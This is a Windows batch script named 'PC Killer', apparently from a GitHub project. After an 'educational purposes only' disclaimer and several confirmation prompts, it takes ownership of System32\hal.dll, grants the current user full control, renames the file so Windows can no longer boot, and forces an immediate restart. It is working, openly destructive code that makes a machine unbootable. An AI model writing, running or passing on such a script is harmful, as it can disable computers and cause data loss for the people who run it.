@echo off
title PC Killer
setlocal
echo Program Name: PC Killer
echo Version: 1.4.3
echo License: GNU General Public License v3.0
echo Developer: @YonatanReuvenIsraeli
echo GitHub: https://github.com/YonatanReuvenIsraeli
echo Sponsor: https://github.com/sponsors/YonatanReuvenIsraeli
"%windir%\System32\net.exe" session > nul 2>&1
if not "%errorlevel%"=="0" goto "NotAdministrator"
goto "Disclaimer"

:"NotAdministrator"
echo.
echo Please run this batch file as an administrator. Press any key to close this batch file.
pause > nul 2>&1
goto "Exit"

:"Disclaimer"
echo.
echo READ DISCLAIMER ^-^-^> THIS IS FOR EDUCATIONAL PURPOSES ONLY! DO NOT USE THIS ON SOMEONE ELSE'S PC WITHOUT THEIR EXPLICIT PERMISSION! THIS WILL KILL THIS PC! CONTINUE AT YOUR OWN RISK! @YONATANREUVENISRAELI HOLDS NO RESPONSIBILITY FOR PC DAMAGE, LOSS OF DATA, AND/OR ANYTHING ELSE, EVEN IF THE INSTRUCTIONS ARE WRONG, AND/OR MISSING, AND/OR THIS BATCH FILE DOES SOMETHING ELSE OTHER THAN INTENDED!
echo.
set Disclaimer=
set /p Disclaimer="Do you agree to the Disclaimer? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto "Fix"
if /i "%Disclaimer%"=="No" goto "Exit"
echo Invalid syntax!
goto "Disclaimer"

:"Fix"
echo.
set Fix=
set /p Fix="To fix this PC, boot into WinPE/WinRE and rename "%windir%\System32\hal" to "hal.dll" then change owner to NT Service\TrustedInstaller and delete %USERNAME% permissions from "%windir%\System32\hal.dll" or use "PC Reviver.bat" made by @YonatanReuvenIsraeli. Do you know how to do this? (Yes/No) "
if /i "%Fix%"=="Yes" goto "Warning"
if /i "%Fix%"=="No" goto "Exit"
echo Invalid syntax!
goto "Fix"

:"Warning"
echo.
set Warning=
set /p Warning="READ WARNING --> THERE IS NO GOING BACK AFTER THIS! THIS IS YOUR LAST CHANCE TO STOP! THIS WILL KILL THIS PC! PLEASE SAVE EVERYTHING YOU WANT BEFORE ANSWERING "YES". ARE YOU SURE YOU WANT TO CONTINUE? (Yes/No) "
if /i "%Warning%"=="Yes" goto "CheckKill"
if /i "%Warning%"=="No" goto "Exit"
echo Invalid syntax!
goto "Warning"

:"CheckKill"
echo.
echo Checking if this PC can be killed by this batch file.
if exist "%windir%\System32\hal.dll" if not exist "%windir%\System32\hal" goto "Kill"
echo This PC cannot be killed by this batch file. Press any key to close this batch file.
pause > nul 2>&1
goto "Exit"

:"Kill"
echo This PC can be killed by this batch file.
"%windir%\System32\takeown.exe" /f "%windir%\System32\hal.dll" > nul 2>&1
"%windir%\System32\icacls.exe" "%windir%\System32\hal.dll" /grant "%USERNAME%":(f) > nul 2>&1
ren "%windir%\System32\hal.dll" "hal" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
endlocal
"%windir%\System32\shutdown.exe" /r /t 0
exit

:"Error"
echo There has been an error! Press any key to try again.
pause > nul 2>&1
goto "CheckKill"

:"Exit"
endlocal
exit
